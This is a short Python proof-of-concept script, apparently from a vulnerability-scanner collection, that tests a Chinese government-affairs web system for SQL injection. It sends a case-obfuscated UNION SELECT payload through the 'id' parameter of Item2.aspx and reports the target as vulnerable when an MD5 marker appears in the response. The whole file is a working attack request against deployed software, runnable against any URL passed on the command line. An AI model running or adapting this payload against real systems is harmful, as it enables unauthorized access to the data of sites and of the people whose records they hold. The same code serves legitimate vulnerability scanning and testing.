#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友政务系统Item2.aspx SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-0120498
author: Lucifer
description: 文件/newsymItemView/Item2.aspx中,参数id存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['农友政务系统Item2.aspx SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/newsymItemView/Item2.aspx?id=021973%27UnIoN%20AlL%20SeLeCt%20NuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CCoNcAt%28Md5%281234%29%29%2CNuLl%2CNuLl%23"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
